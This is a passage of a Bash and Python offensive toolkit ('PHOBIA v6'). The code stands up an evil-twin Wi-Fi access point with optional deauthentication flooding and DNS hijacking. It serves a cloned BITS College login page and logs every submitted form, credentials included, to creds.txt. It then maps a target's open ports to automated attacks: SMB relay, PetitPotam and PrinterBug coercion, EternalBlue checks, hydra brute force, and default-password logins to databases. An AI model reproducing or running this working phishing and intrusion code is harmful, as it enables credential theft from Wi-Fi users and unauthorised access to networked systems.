    read -p "$(echo -e ${YELLOW}"Pick page [1-${#pages[@]}, default=1]: "${NC})" PP
    PP="${PP:-1}"
    case "$PP" in
        c|C) return 1 ;;
        ''|*[!0-9]*) PP=1 ;;
    esac
    if [ "$PP" -lt 1 ] || [ "$PP" -gt "${#pages[@]}" ]; then PP=1; fi
    eval "DNSM_PAGE=\"\$DNSM_PAGE_$PP\""
    echo -e "${GREEN}[+] Page: $(basename "$DNSM_PAGE")${NC}"
    return 0
}

# ===============================================================
# EVIL TWIN — BITS login banner (adds bits-login as a preset)
# ===============================================================
_bits_preset_page() {
    if [ -f "$PAGES_DIR/bits-login.html" ]; then
        echo "$PAGES_DIR/bits-login.html"
    else
        echo ""
    fi
}

# convenience: use bits-login for both DNS spoof and evil twin
_bits_use_for_evil_twin() {
    local b; b=$(_bits_preset_page)
    [ -z "$b" ] && { echo -e "${RED}[!] bits-login.html missing${NC}"; return 1; }
    echo "bits-login.html" > "$PAGES_DIR/.current"
    # evil twin reads $PAGES_DIR/.current when serving
    echo -e "${GREEN}[+] Evil twin will serve bits-login.html${NC}"
    echo -e "${DIM}    activate in Evil Twin menu → option 1 or 2${NC}"
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# EVIL TWIN — BITS login option
# Runs the evil twin AP with bits-login.html as the captive page.
# Independent from DNS spoof. Doesn't touch the other two options.
# ===============================================================
evil_twin_bits() {
    # Pick AP source
    print_banner
    menu_header "E V I L   T W I N   —   B I T S"
    phb_row "  -- AP SOURCE --" "${BOLD}${CYAN}"
    phb_row "  [1]  Create new AP (custom SSID)" "${BOLD}${GREEN}"
    phb_row "  [2]  Clone existing AP (live scan)" "${BOLD}${GREEN}"
    phb_div
    phb_row "  [0]  Back" "${RED}"
    menu_footer
    read -p "$(echo -e ${YELLOW}'Choice [1/2]: '${NC})" AP_SRC
    loading_bar "Loading"

    if [ "$AP_SRC" = "1" ]; then
        read -p "$(echo -e ${YELLOW}'SSID name [BITS College Lab 1]: '${NC})" TARGET_ESSID
        TARGET_ESSID="${TARGET_ESSID:-BITS College Lab 1}"
        read -p "$(echo -e ${YELLOW}'Channel [6]: '${NC})" TARGET_CHANNEL
        TARGET_CHANNEL="${TARGET_CHANNEL:-6}"
        TARGET_BSSID=""
        DO_DEAUTH="no"
    elif [ "$AP_SRC" = "2" ]; then
        do_scan || return
        phb_div
        phb_row "  -- DEAUTH --" "${BOLD}${RED}"
        phb_row "  [1]  WITH deauth"    "${BOLD}${RED}"
        phb_row "  [2]  WITHOUT deauth" "${BOLD}${YELLOW}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice [1/2]: '${NC})" DA
        loading_bar "Loading"
        if [ "$DA" = "1" ]; then DO_DEAUTH="yes"; else DO_DEAUTH="no"; fi
    else
        return
    fi
    brand_detect
    echo -e "${BLUE}[+] SSID: $TARGET_ESSID   Deauth: $DO_DEAUTH${NC}"

    ask_internet_passthrough
    reset_portal_state

    # ensure bits page + logo are always served
    if [ -f "$PAGES_DIR/bits-logo.png" ]; then
        cp "$PAGES_DIR/bits-logo.png" /var/www/html/bits-logo.png 2>/dev/null
        chmod 644 /var/www/html/bits-logo.png 2>/dev/null
    fi
    if [ -f "$PAGES_DIR/google-2step.html" ]; then
        cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
    fi

    # ensure bits page + logo are always served
    if [ -f "$PAGES_DIR/bits-logo.png" ]; then
        cp "$PAGES_DIR/bits-logo.png" /var/www/html/bits-logo.png 2>/dev/null
        chmod 644 /var/www/html/bits-logo.png 2>/dev/null
    fi
    if [ -f "$PAGES_DIR/google-2step.html" ]; then
        cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
    fi

    # ---- deploy BITS page ----
    rm -rf /var/www/html; mkdir -p /var/www/html
    touch /var/www/html/creds.txt
    chmod 666 /var/www/html/creds.txt

    if [ ! -f "$PAGES_DIR/bits-login.html" ]; then
        echo -e "${RED}[!] bits-login.html not found in $PAGES_DIR${NC}"
        addon_wait
        return
    fi
    cp "$PAGES_DIR/bits-login.html" /var/www/html/index.html
    cp "$PAGES_DIR/bits-login.html" /var/www/html/bits-login.html
    cp "$PAGES_DIR/bits-logo.png"   /var/www/html/bits-logo.png 2>/dev/null
    [ -f "$PAGES_DIR/verified.html" ] && cp "$PAGES_DIR/verified.html" /var/www/html/verified.html 2>/dev/null
    [ -f "$PAGES_DIR/google-2step.html" ] && cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
    chmod 644 /var/www/html/*.html /var/www/html/*.png 2>/dev/null
    cp /var/www/html/index.html /tmp/original_page.html

    # ---- DNS config ----
    dnsspoof_pick_mode

    cat > $HOSTAPD_CONF <<EOF
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_ESSID
hw_mode=g
channel=$TARGET_CHANNEL
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
EOF

    cat > $DNSMASQ_CONF <<EOF
interface=$INTERFACE
bind-interfaces
listen-address=$PORTAL_IP
dhcp-range=$SUBNET_BASE.10,$SUBNET_BASE.100,255.255.255.0,12h
dhcp-option=3,$PORTAL_IP
dhcp-option=6,$PORTAL_IP
dhcp-option=114,http://$PORTAL_IP:$PORTAL_PORT/
address=/#/$PORTAL_IP
address=/www.msftconnecttest.com/$PORTAL_IP
address=/www.msftncsi.com/$PORTAL_IP
address=/dns.msftncsi.com/$PORTAL_IP
address=/connectivitycheck.gstatic.com/$PORTAL_IP
address=/connectivitycheck.android.com/$PORTAL_IP
address=/clients3.google.com/$PORTAL_IP
address=/clients4.google.com/$PORTAL_IP
address=/captive.apple.com/$PORTAL_IP
address=/detectportal.firefox.com/$PORTAL_IP
address=/dns.google/$PORTAL_IP
address=/dns.google.com/$PORTAL_IP
address=/dns64.dns.google/$PORTAL_IP
address=/cloudflare-dns.com/$PORTAL_IP
address=/mozilla.cloudflare-dns.com/$PORTAL_IP
address=/one.one.one.one/$PORTAL_IP
address=/doh.opendns.com/$PORTAL_IP
address=/dns.quad9.net/$PORTAL_IP
address=/doh.dns.apple.com/$PORTAL_IP
address=/mask.icloud.com/$PORTAL_IP
address=/mask-h2.icloud.com/$PORTAL_IP
address=/use-application-dns.net/$PORTAL_IP
address=/doh.dns.sb/$PORTAL_IP
address=/doh.pub/$PORTAL_IP
address=/dns.alidns.com/$PORTAL_IP
no-resolv
no-hosts
cache-size=0
EOF

    # ---- small HTTP server ----
    cat > $SERVER_PY <<'PYEOF'
import http.server, socketserver, os
PORT=80; BIND="10.0.0.1"
CREDS="/var/www/html/creds.txt"; ORIGINAL="/tmp/original_page.html"
PROBES=["/generate_204","/gen_204","/hotspot-detect.html","/library/test/success.html","/success.txt","/connecttest.txt","/redirect","/ncsi.txt","/canonical.html","/fwlink","/wpad.dat","/captiveportal","/portal","/mobile/status.php","/kindle-wifi/wifistub.html","/check_network_status.txt"]
PH=["connectivitycheck.gstatic.com","captive.apple.com","www.msftconnecttest.com","www.msftncsi.com","detectportal.firefox.com","clients3.google.com","clients4.google.com","connectivitycheck.android.com","dns.msftncsi.com","www.gstatic.com"]
CAP='<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=http://10.0.0.1/"><script>window.location.href="http://10.0.0.1/";</script></head><body>Sign in</body></html>'

def page():
    try: return open(ORIGINAL).read()
    except: return "<html><body>Sign in</body></html>"

def send(x,b):
    d=b.encode(); x.send_response(200)
    x.send_header("Content-Type","text/html")
    x.send_header("Content-Length",str(len(d)))
    x.end_headers(); x.wfile.write(d)

CLEARED=set()

class H(http.server.SimpleHTTPRequestHandler):
    def __init__(self,*a,**k):
        super().__init__(*a,directory="/var/www/html",**k)

    def _redirect(self, host):
        # 302 to portal root — Windows NCSI, Android, iOS, Firefox all pop up on this
        self.send_response(302)
        self.send_header("Location", "http://10.0.0.1/")
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.send_header("Connection", "close")
        self.end_headers()

    def _serve_file(self, path, ctype="text/html; charset=utf-8"):
        try:
            d = open(path, "rb").read()
        except Exception:
            d = b""
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(d)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(d)

    def do_GET(self):
        ip = self.client_address[0]
        h  = (self.headers.get("Host") or "").lower()
        path = self.path.split("?")[0]

        # 1) DNS-choice endpoint (used by firmware flow)
        if path.startswith("/dns-choice"):
            try:
                with open("/var/www/html/dns_choices.txt","a") as f:
                    f.write("%s %s\n" % (ip, self.path))
            except Exception:
                pass
            self.send_response(204); self.end_headers(); return

        # 2) explicit page routes — before the probe check so these always work
        if path in ("/google-2step.html", "/google-2step", "/google"):
            return self._serve_file("/var/www/html/google-2step.html")
        if path in ("/verified.html", "/verified"):
            try:
                d = open("/var/www/html/verified.html", "rb").read()
            except Exception:
                # full inline fallback — same design as verified.html
                d = """<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\">
<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">
<title>Account Verified — BITS College</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Arial,sans-serif;
background:#fff;color:#3a3a3a;padding:22px 16px;display:flex;align-items:center;
justify-content:center;min-height:100vh}
.wrap{width:100%;max-width:440px;text-align:center}
h1{font-size:18px;font-weight:400;color:#3a3a3a;margin-bottom:20px}
.notice{background:#f4f9ee;border:1px solid #d9e9c6;color:#3d6b1a;border-radius:6px;
padding:11px 14px;font-size:12.5px;line-height:1.5;margin-bottom:20px;text-align:center}
.card{background:#fff;border:1px solid #e6e6e6;border-radius:6px;padding:30px 24px 26px;
box-shadow:0 1px 3px rgba(0,0,0,.04)}
.badge{width:74px;height:74px;border-radius:50%;background:linear-gradient(135deg,#8bc34a,#6aa536);
display:flex;align-items:center;justify-content:center;margin:0 auto 18px;
box-shadow:0 6px 20px rgba(139,195,74,.35)}
.badge svg{width:36px;height:36px}
.tag{display:inline-block;background:#e8f5e0;color:#2f6b14;padding:5px 14px;border-radius:20px;
font-size:12px;font-weight:600;letter-spacing:.3px;margin-bottom:16px}
.welcome{font-size:15px;font-weight:600;color:#3a3a3a;margin-bottom:6px}
.email{font-size:12.5px;color:#7a7a7a;margin-bottom:18px}
.email .v{color:#3d6b1a;font-weight:600;font-family:monospace}
.body{font-size:13px;color:#7a7a7a;line-height:1.55;margin-bottom:22px}
.status{font-size:12px;color:#9aa896;margin-top:14px}
.foot{font-size:11px;color:#999;margin-top:22px}
</style></head><body>
<div class=\"wrap\">
<h1>BITS College's Online Application Service</h1>
<div class=\"notice\"><strong>Verification complete.</strong><br>
You now have full access to the lab network.</div>
<div class=\"card\">
<div class=\"badge\"><svg viewBox=\"0 0 24 24\" fill=\"none\">
<path d=\"M5 13l4 4L19 7\" stroke=\"#fff\" stroke-width=\"3\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/>
</svg></div>
<div class=\"tag\">&#10003; ACCOUNT VERIFIED</div>
<div class=\"welcome\" id=\"w\">Welcome</div>
<div class=\"email\">Signed in as <span class=\"v\" id=\"em\">your account</span></div>
<p class=\"body\">Your BITS account has been successfully verified.<br>
You may safely close this window to continue.</p>
<div class=\"status\" id=\"st\">Closing automatically&hellip;</div>
</div>
<div class=\"foot\">&copy; BITS College</div>
</div>
<script>
var e='';try{var p=new URLSearchParams(location.search);e=p.get('e')||p.get('email')||'';}catch(_){}
try{e=e||sessionStorage.getItem('bits_email')||'';}catch(_){}
if(e){var l=e.split('@')[0]||'';var ps=l.split(/[._-]/).filter(Boolean);
var n=ps.map(function(x){return x.charAt(0).toUpperCase()+x.slice(1)}).join(' ');
if(n)document.getElementById('w').textContent='Welcome, '+n;
document.getElementById('em').textContent=e;}
setTimeout(function(){try{window.open('','_self').close();}catch(_){}
try{window.close();}catch(_){}
setTimeout(function(){document.getElementById('st').textContent='You may close this window manually.';},300);},2500);
</script></body></html>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(d)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            try: self.wfile.write(d)
            except Exception: pass
            return
        if path.startswith("/bits-logo"):
            return self._serve_file("/var/www/html/bits-logo.png", "image/png")
        if path in ("/bits-login.html", "/bits-login"):
            return self._serve_file("/var/www/html/bits-login.html")

        # 3) captive probes → ALWAYS 302. must be before "already cleared" check
        #    because if we 204 a probe the OS marks the network "no internet" and
        #    stops trying — leaving victims stuck with no popup.
        is_probe = (
            any(p in self.path for p in PROBES) or
            any(x in h for x in PH)
        )
        if is_probe:
            return self._redirect(h)

        # 4) already-verified clients get quiet 204 for non-probe paths
        if ip in CLEARED:
            self.send_response(204); self.end_headers(); return

        # 5) static files that exist on disk win
        fp = self.translate_path(path)
        if os.path.isfile(fp) and path not in ("/","/index.html"):
            return super().do_GET()

        # 6) otherwise: serve the phishing landing page
        send(self, page())

    def do_POST(self):
        ip  = self.client_address[0]
        try:
            n = int(self.headers.get("Content-Length", 0) or 0)
        except Exception:
            n = 0
        raw = b""
        try:
            raw = self.rfile.read(n)
        except Exception:
            pass
        raw_s = raw.decode("utf-8", "ignore")

        # log every POST — even if body is empty (so we can see the request landed)
        import urllib.parse as _up, time as _t
        parsed = _up.parse_qs(raw_s)
        clean  = " | ".join("%s=%s" % (k, ",".join(v)) for k, v in parsed.items()) or raw_s or "(empty)"
        ts     = _t.strftime("%Y-%m-%d %H:%M:%S")
        line   = "[%s] %s POST %s -> %s" % (ts, ip, self.path, clean)
        try:
            open(CREDS, "a").write(line + "\n")
        except Exception:
            pass

        CLEARED.add(ip)

        # send back an HTML page that JS-redirects — more reliable than 302 on
        # captive sheets which sometimes ignore Location headers
        host = (self.headers.get("Host") or "").split(":")[0] or "10.0.0.1"
        body = (
            '<!DOCTYPE html><html><head><meta charset="utf-8">'
            '<title>Verified</title>'
            '<meta http-equiv="refresh" content="0;url=http://' + host + '/verified">'
            '<script>window.location.replace("http://' + host + '/verified");</script>'
            '<style>body{font-family:system-ui;background:#f7faf4;'
            'display:flex;align-items:center;justify-content:center;height:100vh;margin:0}'
            '.c{text-align:center}</style>'
            '</head><body><div class="c">'
            '<h2>Verified</h2><p>Redirecting…</p>'
            '</div></body></html>'
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        try:
            self.wfile.write(body)
        except Exception:
            pass

    def log_message(self, *a):
        pass

socketserver.TCPServer.allow_reuse_address=True
srv=socketserver.TCPServer((BIND,PORT),H)
srv.serve_forever()
PYEOF

    export BRAND_NAME
    setup_ap_interfaces || { addon_wait; return; }

    echo -e "${CYAN}[*] Starting dnsmasq...${NC}"
    sudo rm -f /tmp/evil-dnsmasq.log 2>/dev/null; dnsmasq -C $DNSMASQ_CONF --log-queries --log-facility=/tmp/evil-dnsmasq.log >>"$PHOBIA_DEBUG_LOG" 2>&1
    sleep 1
    echo -e "${CYAN}[*] Starting web server...${NC}"
    nohup python3 $SERVER_PY > $SERVER_LOG 2>&1 </dev/null &
    sleep 1

    launch_xterm -bg black -fg '#00ff88' -title "AP STATUS" -geometry $G_AP -e bash -c "tail -f $HOSTAPD_LOG"
    launch_xterm -bg black -fg '#66aaff' -title "WEB SERVER" -geometry $G_WEB -e bash -c "tail -f $SERVER_LOG"
    launch_xterm -bg black -fg '#ffd700' -title "BITS CREDS" -geometry $G_CREDS -e bash -c "tail -f /var/www/html/creds.txt"

    if [ "$DO_DEAUTH" = "yes" ] && [ -n "$TARGET_BSSID" ]; then
        launch_xterm -bg black -fg '#ff5555' -title "DEAUTH" -geometry $G_DEAUTH -e \
            bash -c "ip link set $MONITOR_ACTUAL down 2>/dev/null; iw dev $MONITOR_ACTUAL set type monitor 2>/dev/null; iw dev $MONITOR_ACTUAL set channel $TARGET_CHANNEL 2>/dev/null; ip link set $MONITOR_ACTUAL up 2>/dev/null; sleep 1; aireplay-ng --ignore-negative-one --deauth 0 -a $TARGET_BSSID $MONITOR_ACTUAL; echo; echo '>>> stopped'; read"
    fi

    trap on_interrupt INT
    echo ""
    echo -e "${BOLD}${GREEN}===================================================${NC}"
    echo -e "${BOLD}${GREEN} BITS PHISH RUNNING -- SSID: $TARGET_ESSID${NC}"
    echo -e "${BOLD}${GREEN} Portal: http://$PORTAL_IP/${NC}"
    echo -e "${BOLD}${BLUE} Deauth: $DO_DEAUTH | Internet: $DO_INTERNET${NC}"
    echo -e "${BOLD}${RED} Ctrl+C to STOP and return to menu${NC}"
    echo -e "${BOLD}${GREEN}===================================================${NC}"

    BACK_TO_MENU=0
    while true; do
        if [ "$BACK_TO_MENU" = "1" ]; then
            trap - INT
            BACK_TO_MENU=0
            return
        fi
        sleep 1
    done
}

# ===============================================================
# EVIL TWIN MENU — with 3rd option for BITS
# ===============================================================
menu_evil_twin() {
    trap on_interrupt INT
    prepare_evil_twin_vifs
    while true; do
        print_banner
        menu_header "E V I L   T W I N"
        phb_row "  -- PHISHING --" "${BOLD}${CYAN}"
        phb_row "  [1]  Google 2-Step phishing"  "${BOLD}${CYAN}"
        phb_row "  -- FIRMWARE --" "${BOLD}${PINK}"
        phb_row "  [2]  Modern Firmware Update"  "${BOLD}${PINK}"
        phb_row "  -- CUSTOM PAGES --" "${BOLD}${LIME}"
        phb_row "  [3]  BITS College login page"  "${BOLD}${LIME}"
        phb_row "       (bits-login.html as captive portal)" "${DIM}${GREY}"
        phb_div
        phb_row "  [0]  Back"                    "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" CH
        case "$CH" in
            1) evil_twin_phish ;;
            2) evil_twin_firmware ;;
            3) evil_twin_bits ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# ENTRY POINT
# ===============================================================
# ===============================================================
# PHOBIA v6 — AUTO-ATTACK + MSF AUTO-EXPLOIT
# ===============================================================

# ---- ensure postgres/msfdb ----
_p6_ensure_db() {
    systemctl is-active postgresql >/dev/null 2>&1 || {
        sudo systemctl enable postgresql 2>/dev/null
        sudo systemctl start postgresql 2>/dev/null
        sleep 4
    }
    sudo msfdb status 2>/dev/null | grep -qi "running" || {
        sudo msfdb init 2>&1 | tail -3
        sleep 3
    }
    local c
    c=$(msfconsole -q -x "db_status; exit" 2>&1 | grep -iE "connected|no connection" | head -1)
    echo "$c"
}

# ---- port → attack mapping ----
_p6_plan() {
    local t="$1" ports="$2"
    local plan=()

    if echo "$ports" | grep -qE '\b445\b|\b139\b'; then
        local sign
        sign=$(nmap -p 445 --script smb2-security-mode "$t" 2>/dev/null | grep -i signing)
        echo "$sign" | grep -qi "but not required" && plan+=("445|smb_relay|SMB Relay|HIGH")
        if command -v impacket-rpcdump >/dev/null 2>&1; then
            local rpcs; rpcs=$(timeout 15 impacket-rpcdump "$t" 2>/dev/null)
            echo "$rpcs" | grep -qi "MS-EFSRPC" && plan+=("445|petitpotam|PetitPotam Coerce|HIGH")
            echo "$rpcs" | grep -qi "MS-RPRN\|spoolss" && plan+=("445|printerbug|PrinterBug Coerce|HIGH")
            echo "$rpcs" | grep -qi "MS-PAR" && plan+=("445|printnightmare|PrintNightmare Check|MEDIUM")
        fi
        plan+=("445|smb_enum|SMB Enumeration|LOW")
        nmap -p 445 --script smb-vuln-ms17-010 "$t" 2>/dev/null | grep -qi "VULNERABLE" && \
            plan+=("445|eternalblue|MS17-010 EternalBlue|HIGH")
    fi

    echo "$ports" | grep -qE '\b22\b' && {
        plan+=("22|ssh_enum|SSH Banner Grab|LOW")
        plan+=("22|ssh_brute|SSH Credential Brute|LOW")
    }

    echo "$ports" | grep -qE '\b80\b|\b8080\b|\b8000\b|\b8888\b' && {
        plan+=("80|web_recon|Web Recon|HIGH")
        plan+=("80|web_nuclei|Nuclei CVE Scan|HIGH")
        plan+=("80|web_nikto|Nikto Scan|MEDIUM")
        plan+=("80|web_sqli|SQLi Probe|MEDIUM")
        plan+=("80|web_xss|XSS Probe|MEDIUM")
        plan+=("80|web_fuzz|Directory Fuzz|MEDIUM")
    }

    echo "$ports" | grep -qE '\b3389\b' && {
        plan+=("3389|rdp_bluekeep|BlueKeep Check|LOW")
        plan+=("3389|rdp_brute|RDP Brute|LOW")
    }

    echo "$ports" | grep -qE '\b21\b' && {
        plan+=("21|ftp_anon|FTP Anonymous|HIGH")
        plan+=("21|ftp_brute|FTP Brute|LOW")
    }

    echo "$ports" | grep -qE '\b3306\b' && plan+=("3306|mysql_unauth|MySQL Unauth|HIGH")
    echo "$ports" | grep -qE '\b5432\b' && plan+=("5432|pg_unauth|PostgreSQL Unauth|HIGH")
    echo "$ports" | grep -qE '\b6379\b' && plan+=("6379|redis_unauth|Redis Unauth|HIGH")
    echo "$ports" | grep -qE '\b27017\b' && plan+=("27017|mongo_unauth|MongoDB Unauth|HIGH")
    echo "$ports" | grep -qE '\b5985\b|\b5986\b' && plan+=("5985|winrm_brute|WinRM Brute|MEDIUM")
    echo "$ports" | grep -qE '\b5900\b' && plan+=("5900|vnc_brute|VNC Brute|LOW")
    echo "$ports" | grep -qE '\b23\b' && plan+=("23|telnet_brute|Telnet Brute|LOW")
    echo "$ports" | grep -qE '\b2375\b|\b2376\b' && plan+=("2375|docker_api|Docker API Unauth|HIGH")
    echo "$ports" | grep -qE '\b9200\b' && plan+=("9200|elastic_unauth|Elasticsearch Unauth|HIGH")
    echo "$ports" | grep -qE '\b111\b|\b2049\b' && plan+=("2049|nfs_enum|NFS Enumeration|MEDIUM")

    printf '%s\n' "${plan[@]}"
}

_p6_viable() {
    echo "$1" | grep -qE '\|(HIGH|MEDIUM)$' && return 0 || return 1
}

# ---- individual attacks ----
_p6_smb_enum() {
    echo "── shares ──"; smbclient -L "//$1" -N 2>&1 | head -30
    echo "── users ──";  rpcclient -U "" -N "$1" -c "enumdomusers;getdompwinfo" 2>&1 | head -20
}
_p6_petitpotam() { local m; m=$(_relay_get_my_ip "$(_relay_get_iface)"); impacket-petitpotam "$1" "$m" 2>&1 | tail -10; }
_p6_printerbug() { local m; m=$(_relay_get_my_ip "$(_relay_get_iface)"); impacket-printerbug "$1" "$m" 2>&1 | tail -10; }
_p6_printnightmare() { nmap -p 445 --script smb-vuln-printnightmare "$1" 2>&1 | grep -iE "vuln|printnightmare"; }
_p6_eternalblue() { nmap -p 445 --script smb-vuln-ms17-010 "$1" 2>&1 | grep -iE "VULNERABLE|not vulnerable"; }
_p6_ssh_enum() { timeout 3 nc -nv "$1" 22 2>&1 | head -3; }
_p6_ssh_brute() {
    read -p "  user: " u; read -p "  wordlist [/usr/share/wordlists/rockyou.txt]: " w
    w="${w:-/usr/share/wordlists/rockyou.txt}"
    [ -f "$w" ] && hydra -l "$u" -P "$w" -t 4 "ssh://$1" 2>&1 | tail -20
}
_p6_web_recon() {
    echo "── headers ──"; curl -sI --max-time 5 "http://$1/" 2>/dev/null | head -15
    echo "── title ──";   curl -s --max-time 5 "http://$1/" 2>/dev/null | grep -oiE "<title>[^<]*</title>" | head -3
    echo "── robots ──";  curl -s --max-time 5 "http://$1/robots.txt" 2>/dev/null | head -10
    command -v whatweb >/dev/null 2>&1 && whatweb -a 1 "http://$1/" 2>/dev/null | head -3
}
_p6_web_nuclei() { command -v nuclei >/dev/null 2>&1 && nuclei -u "http://$1/" -silent -severity critical,high,medium 2>&1 | head -40; }
_p6_web_nikto()  { command -v nikto >/dev/null 2>&1 && nikto -h "http://$1/" 2>&1 | head -40; }
_p6_web_sqli() {
    read -p "  URL with params: " u
    [ -z "$u" ] && return
    local b i; b=$(curl -s -o /dev/null -w "%{size_download}" "$u" 2>/dev/null)
    i=$(curl -s -o /dev/null -w "%{size_download}" "${u}'" 2>/dev/null)
    echo "  baseline: $b  with quote: $i"
    [ "$b" != "$i" ] && echo -e "${RED}[!] SQLi candidate${NC}" && \
        read -p "  run sqlmap? [y/N]: " r && [ "$r" = "y" ] && \
        sqlmap -u "$u" --batch --level=2 --risk=2 2>&1 | tail -40
}
_p6_web_xss() {
    read -p "  URL with params: " u
    [ -z "$u" ] && return
    local p; p=$(echo "$u" | grep -oE '[?&][^=&]+=' | head -1 | tr -d '?&=')
    [ -z "$p" ] && return
    local enc='%3Cscript%3Ealert(1)%3C%2Fscript%3E'
    local t; t=$(echo "$u" | sed "s|$p=[^&]*|$p=$enc|")
    curl -s "$t" 2>/dev/null | grep -qF '<script>alert(1)</script>' && \
        echo -e "${RED}[!] XSS reflected — $t${NC}" || echo "[+] not reflected"
}
_p6_web_fuzz()  { command -v ffuf >/dev/null 2>&1 && ffuf -u "http://$1/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 40 -s 2>&1 | head -30; }
_p6_rdp_bluekeep() { nmap -p 3389 --script rdp-vuln-ms12-020 "$1" 2>&1 | grep -iE "vuln|VULNERABLE"; }
_p6_rdp_brute() {
    read -p "  user: " u; read -p "  wordlist: " w; w="${w:-/usr/share/wordlists/rockyou.txt}"
    hydra -l "$u" -P "$w" -t 1 "rdp://$1" 2>&1 | tail -20
}
_p6_ftp_anon()  { timeout 5 bash -c "echo -e 'USER anonymous\nPASS x@x.com\nQUIT' | nc $1 21" 2>&1 | head -10; }
_p6_ftp_brute() {
    read -p "  user: " u; read -p "  wordlist: " w; w="${w:-/usr/share/wordlists/rockyou.txt}"
    hydra -l "$u" -P "$w" -t 4 "ftp://$1" 2>&1 | tail -20
}
_p6_mysql_unauth() {
    for c in "root:" "root:root" "root:toor" "root:password" "root:123456"; do
        u="${c%%:*}"; p="${c##*:}"
        timeout 3 mysql -h "$1" -u "$u" ${p:+-p$p} -e "SELECT 1;" 2>/dev/null | grep -q 1 && {
            echo -e "${RED}[!] WORKING: $u:$p${NC}"; return; }
    done
    echo "[+] no default creds worked"
}
_p6_pg_unauth() {
    for p in "" "postgres" "password" "root"; do
        PGPASSWORD="$p" timeout 3 psql -h "$1" -U postgres -c "SELECT 1;" 2>/dev/null | grep -q 1 && {
            echo -e "${RED}[!] WORKING: postgres:$p${NC}"; return; }
    done
    echo "[+] no default creds worked"
}
_p6_redis_unauth() { local i; i=$(redis-cli -h "$1" INFO 2>&1 | head -5); echo "$i" | grep -qi redis_version && echo -e "${RED}[!] UNAUTH Redis${NC}\n$i" || echo "[+] no unauth"; }
_p6_mongo_unauth() { timeout 5 bash -c "echo 'db.adminCommand({listDatabases:1})' | nc $1 27017" 2>&1 | head -10; }
_p6_winrm_brute() {
    local cme; command -v nxc >/dev/null 2>&1 && cme=nxc || cme=crackmapexec
    read -p "  user: " u; read -sp "  pass: " p; echo ""
    $cme winrm "$1" -u "$u" -p "$p" 2>&1 | tail -10
}
_p6_vnc_brute()   { read -p "  wordlist: " w; w="${w:-/usr/share/wordlists/rockyou.txt}"; hydra -P "$w" -t 1 "vnc://$1" 2>&1 | tail -15; }
_p6_telnet_brute(){ read -p "  user: " u; read -p "  wordlist: " w; w="${w:-/usr/share/wordlists/rockyou.txt}"; hydra -l "$u" -P "$w" -t 4 "telnet://$1" 2>&1 | tail -15; }
_p6_docker_api()  { local r; r=$(curl -s --max-time 5 "http://$1:2375/version" 2>/dev/null); echo "$r" | grep -q "ApiVersion\|Version" && echo -e "${RED}[!] UNAUTH Docker API${NC}\n$r" | head -10 || echo "[+] no unauth"; }
_p6_elastic()     { local r; r=$(curl -s --max-time 5 "http://$1:9200/" 2>/dev/null); echo "$r" | grep -qi "cluster_name\|version" && echo -e "${RED}[!] UNAUTH Elasticsearch${NC}\n$r" | head -10 || echo "[+] no unauth"; }
_p6_nfs_enum()    { command -v showmount >/dev/null 2>&1 && showmount -e "$1" 2>&1 | head -20; }

# ---- dispatcher ----
_p6_run() {
    local t="$1" k="$2"
    case "$k" in
        smb_relay)       _relay_launch "$t" "$(_relay_get_iface)" 2>/dev/null ;;
        petitpotam)      _p6_petitpotam "$t" ;;
        printerbug)      _p6_printerbug "$t" ;;
        printnightmare)  _p6_printnightmare "$t" ;;
        smb_enum)        _p6_smb_enum "$t" ;;
        eternalblue)     _p6_eternalblue "$t" ;;
        ssh_enum)        _p6_ssh_enum "$t" ;;
        ssh_brute)       _p6_ssh_brute "$t" ;;
        web_recon)       _p6_web_recon "$t" ;;
        web_nuclei)      _p6_web_nuclei "$t" ;;
        web_nikto)       _p6_web_nikto "$t" ;;
        web_sqli)        _p6_web_sqli "$t" ;;
        web_xss)         _p6_web_xss "$t" ;;
        web_fuzz)        _p6_web_fuzz "$t" ;;
        rdp_bluekeep)    _p6_rdp_bluekeep "$t" ;;
        rdp_brute)       _p6_rdp_brute "$t" ;;
        ftp_anon)        _p6_ftp_anon "$t" ;;
        ftp_brute)       _p6_ftp_brute "$t" ;;
        mysql_unauth)    _p6_mysql_unauth "$t" ;;
        pg_unauth)       _p6_pg_unauth "$t" ;;
        redis_unauth)    _p6_redis_unauth "$t" ;;
        mongo_unauth)    _p6_mongo_unauth "$t" ;;
        winrm_brute)     _p6_winrm_brute "$t" ;;
        vnc_brute)       _p6_vnc_brute "$t" ;;
        telnet_brute)    _p6_telnet_brute "$t" ;;
        docker_api)      _p6_docker_api "$t" ;;
        elastic_unauth)  _p6_elastic "$t" ;;
        nfs_enum)        _p6_nfs_enum "$t" ;;
        *) echo -e "${RED}[!] unknown attack: $k${NC}" ;;
    esac
}

# ---- attack a device (v6) ----
_auto_attack_device() {
    trap phobia_interrupt INT
    lan_pick_target "TARGET" || return
    local target="$LAN_TARGET_IP"

    print_banner
    menu_header "A T T A C K   A   D E V I C E"
    phb_row "  Target: $target" "${BOLD}${YELLOW}"
